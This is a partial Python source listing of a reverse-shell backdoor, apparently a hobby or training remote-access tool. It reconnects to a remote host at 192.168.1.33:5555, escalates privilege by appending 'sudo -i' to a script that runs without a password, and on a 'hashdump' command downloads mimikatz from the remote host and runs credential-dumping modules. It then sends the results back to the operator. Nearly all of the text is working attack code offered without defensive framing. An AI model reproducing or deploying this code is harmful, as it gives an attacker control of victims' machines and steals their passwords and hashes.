...
def connection():
    while True:
        time.sleep(5)  # Wait for some seconds before reconnecting (for resilience)
        try:
            # Connect to a remote host with IP and port
            s.connect(('192.168.1.33', 5555))
...
def shell():
    while True:
        ...
        if command == 'quit':
            ...
            # If the command is 'getsystem', do the privilege escalation
            # Append the command "sudo -i" to the file that do not need sudo password to execute
            subprocess.Popen('echo "\nsudo -i" >> /home/puchit/Downloads/dist/WhoNeedSudo.sh', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            execute = subprocess.Popen('sh /home/puchit/Downloads/dist/WhoNeedSudo.sh', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            ...
            # If the command is 'hashdump', download the mimikatz.exe file from the remote host
            download_file('mimikatz.exe')
            # Run the specific command
            execute = subprocess.Popen('mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()  # Capture the command's output
            result = result.decode()  # Decode the output to a string
            # Send the command execution result back to the remote host
            reliable_send(result)
